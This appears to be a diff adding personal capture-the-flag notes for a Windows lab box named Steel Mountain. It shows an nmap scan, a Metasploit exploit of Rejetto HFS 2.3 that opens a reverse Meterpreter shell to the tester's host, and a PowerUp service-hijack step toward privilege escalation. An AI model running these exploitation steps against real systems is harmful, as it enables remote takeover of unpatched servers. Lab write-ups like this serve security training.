@@ -1,0 +1,146 @@
+1.  nmap -sT -sV -A 10.10.62.56   
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-22 15:48 EDT
+Stats: 0:00:49 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 0.00% done
+Stats: 0:00:59 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 41.67% done; ETC: 15:49 (0:00:24 remaining)
+Nmap scan report for 10.10.62.56
+Host is up (0.22s latency).
+Not shown: 988 closed ports
+PORT      STATE SERVICE            VERSION
+80/tcp    open  http               Microsoft IIS httpd 8.5
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/8.5
+|_http-title: Site doesn't have a title (text/html).
+135/tcp   open  msrpc              Microsoft Windows RPC
+139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+3389/tcp  open  ssl/ms-wbt-server?
+| rdp-ntlm-info: 
+|   Target_Name: STEELMOUNTAIN
+|   NetBIOS_Domain_Name: STEELMOUNTAIN
+|   NetBIOS_Computer_Name: STEELMOUNTAIN
+|   DNS_Domain_Name: steelmountain
+|   DNS_Computer_Name: steelmountain
+|   Product_Version: 6.3.9600
+|_  System_Time: 2021-09-22T19:51:07+00:00
+| ssl-cert: Subject: commonName=steelmountain
+| Not valid before: 2021-09-21T19:46:59
+|_Not valid after:  2022-03-23T19:46:59
+|_ssl-date: 2021-09-22T19:51:13+00:00; -1s from scanner time.
+8080/tcp  open  http               HttpFileServer httpd 2.3
+|_http-server-header: HFS 2.3
+|_http-title: HFS /
+49152/tcp open  msrpc              Microsoft Windows RPC
+49153/tcp open  msrpc              Microsoft Windows RPC
+49154/tcp open  msrpc              Microsoft Windows RPC
+49155/tcp open  msrpc              Microsoft Windows RPC
+49156/tcp open  msrpc              Microsoft Windows RPC
+49163/tcp open  msrpc              Microsoft Windows RPC
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.91%E=4%D=9/22%OT=80%CT=1%CU=35099%PV=Y%DS=4%DC=T%G=Y%TM=614B893
+OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=2%ISR=10A%TI=I%CI=I%TS=7)SEQ(SP=1
+OS:00%GCD=1%ISR=10A%TI=I%CI=I%II=I%SS=S%TS=7)OPS(O1=M506NW8ST11%O2=M506NW8S
+OS:T11%O3=M506NW8NNT11%O4=M506NW8ST11%O5=M506NW8ST11%O6=M506ST11)WIN(W1=200
+OS:0%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M50
+OS:6NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%
+OS:W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=
+OS:)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=
+OS:S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF
+OS:=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=
+OS:G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)
+
+Network Distance: 4 hops
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: -1s, deviation: 0s, median: -1s
+|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:23:9c:aa:b4:3d (unknown)
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-09-22T19:51:07
+|_  start_date: 2021-09-22T19:46:54
+
+TRACEROUTE (using proto 1/icmp)
+HOP RTT       ADDRESS
+1   76.30 ms  10.13.0.1
+2   ... 3
+4   216.29 ms 10.10.62.56
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 169.68 seconds
+
+Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2) can be exploited use MSFCONSOLE
+
+msf6 exploit(windows/http/rejetto_hfs_exec) > run 
+
+[*] Started reverse TCP handler on 10.13.25.160:4444 
+[*] Using URL: http://0.0.0.0:8080/NFEMSWeg2
+[*] Local IP: http://192.168.0.179:8080/NFEMSWeg2
+[*] Server started.
+[*] Sending a malicious request to /
+[*] Payload request received: /NFEMSWeg2
+[*] Sending stage (175174 bytes) to 10.10.62.56
+[!] Tried to delete %TEMP%\fZrPmMEntQe.vbs, unknown result
+[*] Meterpreter session 1 opened (10.13.25.160:4444 -> 10.10.62.56:49249) at 2021-09-22 16:31:59 -0400
+[*] Server stopped.
+
+ls
+Listing: C:\Users\bill\Desktop
+==============================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100666/rw-rw-rw-  282   fil   2019-09-27 07:07:07 -0400  desktop.ini
+100666/rw-rw-rw-  70    fil   2019-09-27 08:42:38 -0400  user.txt
+
+meterpreter > cat user.txt
+��b04763b6fcf51fcd7c13abc7db4fd365
+meterpreter > 
+
+
+
+meterpreter > upload /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1
+[*] uploading  : /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 -> PowerUp.ps1
+[*] Uploaded 483.72 KiB of 483.72 KiB (100.0%): /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 -> PowerUp.ps1
+[*] uploaded   : /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 -> PowerUp.ps1
+meterpreter > ls
+Listing: C:\Users\bill\Desktop
+==============================
+
+Mode              Size    Type  Last modified              Name
+----              ----    ----  -------------              ----
+100666/rw-rw-rw-  495329  fil   2021-09-22 16:42:22 -0400  PowerUp.ps1
+100666/rw-rw-rw-  282     fil   2019-09-27 07:07:07 -0400  desktop.ini
+100666/rw-rw-rw-  70      fil   2019-09-27 08:42:38 -0400  user.txt
+
+meterpreter > PowerUp.ps1
+[-] Unknown command: PowerUp.ps1
+meterpreter > ./PowerUp.ps1
+[-] Unknown command: ./PowerUp.ps1
+meterpreter > load powershell
+Loading extension powershell...Success.
+meterpreter > power_shell
+[-] Unknown command: power_shell
+meterpreter > powershell_shell
+PS > . .\PowerUp.ps1
+PS > Invoke-AllCheks 
+
+
+
+ServiceName   : AdvancedSystemCareService9
+Path          : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+StartName     : LocalSystem
+AbuseFunction : Write-ServiceBinary -ServiceName 'AdvancedSystemCareService9' -Path <HijackPath>
+
+repace ASCService with MSFvenom.exe then stop and star Service 
+
